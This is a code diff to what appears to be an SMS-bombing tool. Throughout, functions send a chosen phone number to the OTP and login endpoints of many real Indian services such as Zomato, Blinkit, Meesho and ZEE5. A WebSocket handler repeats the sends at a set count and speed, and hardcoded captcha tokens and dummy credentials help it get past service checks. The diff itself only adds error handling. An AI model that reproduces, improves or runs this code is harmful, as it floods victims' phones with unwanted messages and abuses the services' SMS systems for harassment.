@@ -41,13 +41,21 @@ async function mywallety(number) {
                 "random": walletlyrandom(),
                 "method": "sendOtp"
             })
-        }).then((res) => { try { return res.json() } catch (err) { return } }).
-            then((data) => {
-
-                if (data?.status === "success")
-                    resolve(true)
-                resolve(false);
-            });
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).
+        then((data) => {
+            if (data?.status === "success")
+                resolve(true)
+            resolve(false);
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
     })
 
 }
@@ -60,11 +68,20 @@ async function infinitylearn(number) {
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({ "isd_code": "+91", "phone": number, "tenant_id": "1", "product_id": "300" })
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
             if (data === true)
                 resolve(true)
             resolve(false)
-        })
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
     })
 }
 
@@ -82,11 +99,20 @@ async function my11circle(number) {
                 "refCode": "",
                 "isPlaycircle": false
             })
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
             if (data?.success === true)
                 resolve(true)
             resolve(false)
-        })
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
 
     })
 
@@ -100,12 +126,20 @@ async function housing(number) {
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({ "query": "\n  mutation(\n    $email: String\n    $phone: String\n    $otpLength: Int\n    $userAgent: String\n    $method: String\n  ) {\n    sendOtp(\n      phone: $phone\n      email: $email\n      otpLength: $otpLength\n      userAgent: $userAgent\n      method: $method\n    ) {\n      success\n      message\n    }\n  }\n", "variables": { "phone": number, "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" } })
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
-
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
             if (data?.data?.sendOtp.success === true)
                 resolve(true)
             resolve(false)
-        })
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
     })
 
 }
@@ -122,11 +156,20 @@ async function zomato(number) {
         fetch("https://accounts.zomato.com/login/phone", {
             method: "POST",
             body: data
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
             if (data?.status === true && data?.message === "Check text messages for your OTP")
                 resolve(true)
             resolve(false)
-        })
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
     })
 
 }
@@ -143,11 +186,20 @@ async function fantv(number) {
                 "phoneCountryCode": "+91",
                 "userId": "66cc47322c93001caa0d9f01"
             })
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
             if (data?.message === "success")
                 resolve(true)
             resolve(false)
-        })
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
     })
 }
 
@@ -162,23 +214,41 @@ async function byjus(number) {
                 "phone": "+91-" + number,
                 "app_client_id": "90391da1-ee49-4378-bd12-1924134e906e"
             })
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
             if (data?.id === "00000000-0000-0000-0000-000000000000") {
                 resolve(true)
             }
             resolve(false)
-        })
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
 
     })
 }
 
 async function netmeds(number) {
     return new Promise((resolve) => {
-        fetch("https://www.netmeds.com/mst/rest/v1/id/details/" + number,).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+        fetch("https://www.netmeds.com/mst/rest/v1/id/details/" + number,).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
             if (data?.result?.otp_details?.random_key)
                 resolve(true)
             resolve(false)
-        })
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
     })
 
 }
@@ -191,11 +261,20 @@ async function unacademy(number) {
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({ "phone": number, "country_code": "IN", "otp_type": 1, "email": "", "send_otp": true, "is_un_teach_user": false })
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
             if (data?.message === "OTP has been sent to your phone number")
                 resolve(true)
             resolve(false)
-        })
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
     })
 }
 
@@ -215,11 +294,20 @@ async function medibuddy(number) {
                 "advertiserId": "22003edf-0bc8-L8d1-9012-28760f6f6e44",
                 "mbUserId": "null"
             })
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
             if (data?.data?.OtpStatus === "Sent")
                 resolve(true)
             resolve(false)
-        })
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
     })
 }
 
@@ -239,11 +327,20 @@ async function momsco(number) {
                 "name": "",
                 "vendorCode": "tmc"
             })
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
             if (data?.message === "Successfully Generated OTP")
                 resolve(true)
             resolve(false)
-        })
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
     })
 }
 
@@ -257,7 +354,14 @@ async function ajio(number) {
             body: JSON.stringify({
                 "mobileNumber": number
             })
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
             if (data?.success === true)
                 resolve(true)
             else {
@@ -275,13 +379,24 @@ async function ajio(number) {
                         "requestType": "SENDOTP",
                         "newDesign": false
                     })
-                }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+                }).then((res)=>{
+                    let contenttype = res.headers.get("content-type")
+                    if(contenttype && contenttype.includes("application/json") === true){
+                        return res.json()
+                    }else{
+                        resolve(false)
+                    }
+                }).then((data) => {
                     if (data?.statusCode === "1")
                         resolve(true)
                     resolve(false)
-                })
+                }).catch((err)=>{
+                    console.log("error occured during fetch: "+err);
+                });
             }
-        })
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
     })
 }
 
@@ -296,7 +411,14 @@ async function nxtwave(number) {
                 "data": "\"{\\\"phone_number\\\":\\\"" + number + "\\\",\\\"country_code\\\":\\\"+91\\\"}\"",
                 "clientKeyDetailsId": 1
             })
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
             if (data?.user_id) {
                 resolve(true)
             } else {
@@ -320,9 +442,13 @@ async function nxtwave(number) {
                             resolve(true)
                         })
                     }
-                })
+                }).catch((err)=>{
+                    console.log("error occured during fetch: "+err);
+                });
             }
-        })
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
     })
 }
 
@@ -339,11 +465,20 @@ async function tradex(number) {
                 "country_code": "+91",
                 "version": 1099
             })
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
             if (data?.success === "true")
                 resolve(true)
             resolve(false)
-        })
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
     })
 }
 
@@ -357,11 +492,20 @@ async function kukufm(number) {
             body: JSON.stringify({
                 "phone_number": "+91" + number
             })
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
             if (data?.message === "OTP sent successfully")
                 resolve(true)
             resolve(false)
-        })
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
     })
 }
 
@@ -376,11 +520,20 @@ async function blinkit(number) {
             body: new URLSearchParams({
                 "user_phone": number
             })
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
             if (data?.sms_sent === true)
                 resolve(true)
             resolve(false)
-        })
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
     })
 }
 
@@ -388,11 +541,20 @@ async function jar(number) {
     return new Promise((resolve) => {
         fetch("https://zeon-r.myjar.app/v1/pwa/zeon/authRequest?phoneNumber=" + number + "&countryCode=91&partnerId=undefined&captchaResponse=03AFcWeA7s59rsqDWOInFwdOuos_8a78hOW3BVNhQ_CRSvPS4YTz9r-4m1e62NGww4FaICgz9GemkT9gblTGm9MjkeeOhs11FeXRclJixEVWLGAR4cFlya5VjXhhE7VqI_K2BvodvCvvUQzF7bJaXBhsQibE_s4px4VpGa8kBviozmy0LlSwv9EGh3VgQa-g7GifOtsncXLQW6_DA-nLQMEckRpl_1xLjZXcDZncmTz5U2KvErEEIhOVWJzpZfM8sbvkwOKFffneORAYFqMCuEe1N6eUBr9tYN7chYi0_hqWR_Z9_1b9soKk8m9JKVsmfDa7w8j3HlksOZSvrYgqeBJCrffhRToAgQ1uyuJZTc6BhxUA7x9bIoIqPBLvDHGFRi-hJWKQev_GwiNHfd-o0febSDojOdOo7iddb5-3MiBtTfOAYrcnlcCZEnTjqtiywlfMMFmoGGOqGPWfOX1KqCPPDAsiI7kjHehLgzwI-rnBkwFheS1kELHDvNVU9DTSQYfW1XV1gfEennqKQpoQP3wUyolz0qaB2Mg-G3LRnpV2zPenZc18moo5FskM_oEPY9TPhq11S5WOj782ayn4kp-_-hBjuRSUvCmv6x21mI6Vp4MOiIatmQ7G40LcEIu-_vhvEI-rMerFqVfAo4CJJUz85s8LzjhMX8ucZdPFNttMg2vj7udQpyghPxSGJrStRRbRxUC_5iLfAqVvVyOLv6-EMT8FUuSCKTWIrotZNrFYrhvsA9JOPKK9ZzvQHbblJECBCGnB3Va01yjYThaph9OGwXTEbYHJpq_oLvYNC0db6wpMHI3YS5P07W8SzgT58TpT-stI00PClE6kLGeGpGoWs-tEOb0CXC8DDoCTWeZsId-I_os-5MUo2UpG_O2L7-Df6tdnPWjA8qpnTnnSPOMBvEUjcjYV5SSVRDVrIln7pf0jv2EM3BGxJd3DxskeGxDUbV8qShiqnUm_WN8nt8Wye0bPnifw-ECZclGEa3stBPvrms_CFEm8nK3zTKUdAfNLuFTQlGR9XASom4XUqEGravhMk7lGWFKuV8n6vyOzMDO0yh1GtQ9k90bfzuvZ0Pp_zlPg72cbYTkxPPMXuhm8sYAODx9j260hNqrYpPahJwHf0pQR6x0C0e4c-K42-ZhvM6iR2lW_HUCiMv7T_9rwXGERX-tnRxawlhu2EtwuH_gGvLp5cF3moBbzR_etp45KZ8trO-nrBLDTh5AsnXpxkfJyIMMBqk0tJMzo8BFD2MrmQGNorPW9N8PFDw_Bjv6mFo-OxABliE06Q0ocbTnas-fOR32n_5tLLnyB-bEieOrmzMuK3nYEeO-AK35HFmiVH507BBXlapgd-suUoEQN_vEWgm2GpzX0bfKlSzesx5DaPoZWRaIjnmyjT5PG6Yp4CVz_aivNovVIrn4YENLIgzFCeQ3wAc3g5k-t7juktRuPkms_xqtnZyB1xDgSAuparH7cTtQ4IHR8r_86XL9e97D_k1gcpsq6IX1BMvzU-xVCVqKWKTpM1-_9_TDDb-ETfpXV19z9DHR6cB6Lys1w_JJ4tOhIZ7vzMtfHSdyeVobWtHCz9mCsuAq3aCHRVRIgui0O9lb-MG-jdLLHwc9ZlnSaRK-cLK99J5BAxV4ebJsjpb4cJ6tz7rMXzh3ugmM3EhZ188aDsRMla1PoI-N_PNLP3Et0Lm3JuVcFrsNc2uoZfMvL9YvJfgFx4FW6mDpnAt2U30843f868r9kGi2HDBPYOrDEkn46ApHYum1L7If-MAUSM3T4RgZdP11cOVovU3kqrjiRT9XDfHKF28ww4Q9Tj9CTG1-Ka_OoGHAvnE3IydIedXC8qXAW3ybFsPwURinImBzU0a", {
             method: "POST",
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
             if (data?.success === true)
                 resolve(true)
             resolve(false)
-        })
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
     })
 }
 
@@ -410,11 +572,20 @@ async function probo(number) {
                 "mobile": number,
                 "is_following_referee": false
             })
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
             if (data?.message === "Successfully Done!!")
                 resolve(true)
             resolve(false)
-        })
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
     })
 }
 
@@ -435,7 +606,14 @@ async function eatclub(number) {
                 "email": "dgsghs@gmail.com",
                 "password": "dsafsdg"
             })
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
             if (data?.meta.status === "Not OK") {
                 fetch("https://accounts.box8.co.in/customers/change_phone?origin=eatClub&platform=web", {
                     method: "POST",
@@ -444,14 +622,23 @@ async function eatclub(number) {
                         "authorization": authorization
                     },
                     body: JSON.stringify({ "phone_no": number })
-                }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+                }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
                     if (data?.meta.status === "OK")
                         resolve(true)
                     resolve(false)
                 })
             } else
                 resolve(true)
-        })
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
     })
 }
 
@@ -467,7 +654,14 @@ async function croma(number) {
                 "countryCode": "91",
                 "phone": number
             })
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
             if (data?.message === "User not found") {
                 fetch("https://api.tatadigital.com/api/v2/sso/check-phone", {
                     method: "POST",
@@ -480,14 +674,25 @@ async function croma(number) {
                         "sendOtp": true,
                         "phone": number
                     })
-                }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+                }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
                     if (data?.refId)
                         resolve(true)
                     resolve(false)
-                })
+                }).catch((err)=>{
+                    console.log("error occured during fetch: "+err);
+                });
             } else
                 resolve(true)
-        })
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
     })
 }
 
@@ -511,7 +716,14 @@ async function hoichoi(number) {
                 "requestType": "send",
                 "screenName": "signin"
             })
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
             if (data?.error) {
                 fetch("https://prod-api.viewlift.com/identity/signup?site=hoichoitv&deviceId=browser-" + hoichoirandom() + "-a627-f106-af27-2b7" + hoichoirandom() + "5d82", {
                     method: "POST",
@@ -524,14 +736,23 @@ async function hoichoi(number) {
                         "requestType": "send",
                         "whatsappConsent": true
                     })
-                }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+                }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
                     if (data?.sent === "true")
                         resolve(true)
                     resolve(false)
                 })
             } else
                 resolve(true)
-        })
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
     })
 }
 
@@ -551,11 +772,20 @@ async function jiocinema(number) {
                 "appVersion": "24.08.12.5-472b0237",
                 "retry_count": 0
             })
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
             if (data?.OTPInfo)
                 resolve(true)
             resolve(false)
-        })
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
     })
 }
 
@@ -578,11 +808,20 @@ async function fancode(number) {
                 },
                 "query": "fragment RequestOTPParams on AuthOTPResult {\n  message\n  success\n  totalAttemptCount\n  retryAfter\n  remainingAttemptCount\n  resendButtonActiveIn\n  newUser\n  email\n  password\n}\n\nmutation RequestOTP($mobileNumber: String!, $email: String, $password: String) {\n  requestAuthOTP(mobileNumber: $mobileNumber, email: $email, password: $password) {\n    ...RequestOTPParams\n  }\n}\n        "
             })
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
             if (data?.data !== null)
                 resolve(true)
             resolve(false)
-        })
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
     })
 
 }
@@ -590,11 +829,20 @@ async function fancode(number) {
 async function gamezone(number) {
     return new Promise((resolve) => {
         fetch("https://api.dotshowroom.in/api/dotk/vo1/user/login/" + number + "?source=digital_showroom&domain=https://www.digitalgamezone.co.in/orders")
-            .then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+            .then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
                 if (data?.status)
                     resolve(true)
                 resolve(false)
-            })
+            }).catch((err)=>{
+                console.log("error occured during fetch: "+err);
+            });
     })
 }
 
@@ -610,11 +858,20 @@ async function meesho(number) {
                 "phone_number": number
             })
         })
-            .then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+            .then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
                 if (data?.data)
                     resolve(true)
                 resolve(false)
-            })
+            }).catch((err)=>{
+                console.log("error occured during fetch: "+err);
+            });
     })
 }
 
@@ -642,11 +899,20 @@ async function zee5(number) {
                 "esk": token
             },
             body: JSON.stringify({ "phoneno": "91" + number })
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
             if (data?.message === "SMS successfully sent")
                 resolve(true)
             resolve(false)
-        })
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
     })
 }
 
@@ -658,7 +924,14 @@ async function mamaearth(number) {
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({ "mobile": number, "referralCode": "" })
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
             if (data?.status)
                 resolve(true)
             else {
@@ -668,13 +941,22 @@ async function mamaearth(number) {
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({ "mobile": number, "isGokwik": false })
-                }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+                }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
                     if (data?.status)
                         resolve(true)
                     resolve(false)
                 })
             }
-        })
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
     })
 }
 
@@ -686,7 +968,14 @@ async function derma(number) {
                 "Content-Type": "application/json"
             },
             body: JSON.stringify({ "mobile": number, "referralCode": "" })
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
             if (data?.status)
                 resolve(true)
             else {
@@ -696,13 +985,24 @@ async function derma(number) {
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({ "mobile": number, "isGokwik": false })
-                }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+                }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
                     if (data?.status)
                         resolve(true)
                     resolve(false)
-                })
+                }).catch((err)=>{
+                    console.log("error occured during fetch: "+err);
+                });
             }
-        })
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
     })
 }
 
@@ -722,11 +1022,20 @@ async function uspolo(number) {
                 "domain": "uspoloassn.in",
                 "recaptcha_token": ""
             })
-        }).then((res) => { try { return res.json() } catch (err) { return } }).then((data) => {
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if(contenttype && contenttype.includes("application/json") === true){
+                return res.json()
+            }else{
+                resolve(false)
+            }
+        }).then((data) => {
             if (data?.message === "OTP sent successfully!")
                 resolve(true)
             resolve(false)
-        })
+        }).catch((err)=>{
+            console.log("error occured during fetch: "+err);
+        });
     })
 }
 
@@ -794,7 +1103,11 @@ module.exports = function(wss){
                 return;
             }
             ws.send("processing")
-            sendsms(data.number,ws,parseInt(data.times),parseInt(data.speed))
+            sendsms(data.number,ws,parseInt(data.times),parseInt(data.speed)).catch((err)=>{
+                console.log(err)
+                ws.send("error")
+                ws.close()
+            })
         })
     })
 }
